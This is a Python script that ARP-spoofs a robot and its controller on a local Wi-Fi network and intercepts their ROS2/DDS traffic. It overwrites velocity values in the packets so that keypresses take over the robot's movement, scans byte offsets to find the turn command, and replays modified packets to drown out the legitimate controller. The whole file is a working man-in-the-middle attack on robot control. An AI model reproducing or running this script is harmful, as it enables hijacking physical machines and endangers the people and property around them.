from scapy.all import *
from netfilterqueue import NetfilterQueue
import threading
import time
import subprocess
import struct
import sys
import select
import tty
import termios

# --- SETTINGS ---
robot_ip      = "192.168.0.194"
controller_ip = "192.168.0.16"
interface     = "wlan0"
queue_number  = 1

# THE DATA FROM YOUR WORKING HEX (Verified -1.25)
HEX_VAL = b'\x9a\x99\x99\x99\x99\x99\xc9\xbf'
HEX_ZERO = b'\x00\x00\x00\x00\x00\x00\x00\x00'

current_nudge = 4
active_key = None
last_packet = None

# --- SSH KEYBOARD ENGINE ---
def get_key():
    old_settings = termios.tcgetattr(sys.stdin)
    try:
        tty.setcbreak(sys.stdin.fileno())
        if select.select([sys.stdin], [], [], 0.1)[0]:
            return sys.stdin.read(1)
        return None
    finally:
        termios.tcsetattr(sys.stdin, termios.TCSADRAIN, old_settings)

def scanner_logic_thread():
    global current_nudge, active_key
    print("[*] SCANNER ACTIVE: Hold 'A' to find the Turn Offset.")
    while True:
        key = get_key()
        if key:
            active_key = key.lower()
            if active_key == ' ':
                print(f"\n[!] LOCKED OFFSET: {current_nudge}")
                time.sleep(2)
        else:
            active_key = None
        time.sleep(0.05)

def offset_cycler_thread():
    global current_nudge, active_key
    while True:
        if active_key == 'a':
            # Cycles through every 4-byte alignment
            print(f"\r[*] Testing Offset: data_start + {current_nudge} ... ", end="")
            sys.stdout.flush()
            time.sleep(3)
            current_nudge += 4
            if current_nudge > 80:
                current_nudge = 4
        time.sleep(0.1)

# --- THE INJECTION ENGINE ---
def inject_data(scapy_pkt):
    global current_nudge, active_key
    if not scapy_pkt.haslayer(Raw): return None
    raw_data = bytearray(scapy_pkt[Raw].load)
    
    marker_pos = raw_data.find(b'\x15\x05')
    if marker_pos != -1:
        # Check both common ROS2/DDS CDR headers
        data_start = raw_data.find(b'\x01\x00\x00\x00', marker_pos)
        if data_start == -1:
            data_start = raw_data.find(b'\x00\x00\x01\x00', marker_pos)
        
        if data_start != -1:
            # Verified S-Key Offset
            lin_off = data_start + 4
            # Scanning A-Key Offset
            turn_off = data_start + current_nudge
            
            if active_key == 's':
                raw_data[lin_off:lin_off+8] = HEX_VAL
            elif active_key == 'a' and len(raw_data) >= turn_off + 8:
                raw_data[turn_off:turn_off+8] = HEX_VAL
            
            scapy_pkt[Raw].load = bytes(raw_data)
            # Recompute Checksums
            if IP in scapy_pkt:
                del scapy_pkt[IP].len; del scapy_pkt[IP].chksum
            if UDP in scapy_pkt:
                del scapy_pkt[UDP].len; del scapy_pkt[UDP].chksum
            return scapy_pkt
    return None

def process_packet(packet):
    global last_packet
    try:
        scapy_pkt = IP(packet.get_payload())
        if scapy_pkt.haslayer(Raw):
            last_packet = scapy_pkt
            mod = inject_data(scapy_pkt)
            if mod:
                packet.set_payload(bytes(mod))
    except: pass
    packet.accept()

def ghost_feeder():
    global last_packet
    while True:
        if last_packet and active_key:
            mod = inject_data(last_packet.copy())
            if mod:
                send(mod, verbose=False)
        time.sleep(0.05)

# --- HIGH-INTENSITY ARP FLOOD ---
def arp_flood(r_mac, c_mac):
    p1 = Ether(dst=r_mac)/ARP(op=2, pdst=robot_ip, hwdst=r_mac, psrc=controller_ip)
    p2 = Ether(dst=c_mac)/ARP(op=2, pdst=controller_ip, hwdst=c_mac, psrc=robot_ip)
    print("[!] ARP FLOOD ACTIVE: Drowning out legitimate controller...")
    while True:
        sendp(p1, iface=interface, verbose=False)
        sendp(p2, iface=interface, verbose=False)
        # No sleep for maximum saturation

def fetch_mac(ip):
    subprocess.run(["ping", "-c", "1", "-W", "1", ip], stdout=subprocess.DEVNULL)
    try:
        output = subprocess.check_output(["arp", "-n", ip]).decode()
        for line in output.splitlines():
            if ip in line:
                parts = line.split()
                for p in parts:
                    if ":" in p: return p
    except: return None
    return None

if __name__ == "__main__":
    r_mac = fetch_mac(robot_ip)
    c_mac = fetch_mac(controller_ip)
    
    if r_mac and c_mac:
        print(f"[*] Targets Acquired: Robot({r_mac}) Controller({c_mac})")
        # Start Threads
        threading.Thread(target=arp_flood, args=(r_mac, c_mac), daemon=True).start()
        threading.Thread(target=scanner_logic_thread, daemon=True).start()
        threading.Thread(target=offset_cycler_thread, daemon=True).start()
        threading.Thread(target=ghost_feeder, daemon=True).start()
        
        nfqueue = NetfilterQueue()
        nfqueue.bind(queue_number, process_packet)
        print("[*] SCANNER READY. Hold 'A' to begin offset hunt.")
        try:
            nfqueue.run()
        except KeyboardInterrupt:
            nfqueue.unbind()
    else:
        print("[!] Discovery failed. Check your IP settings.")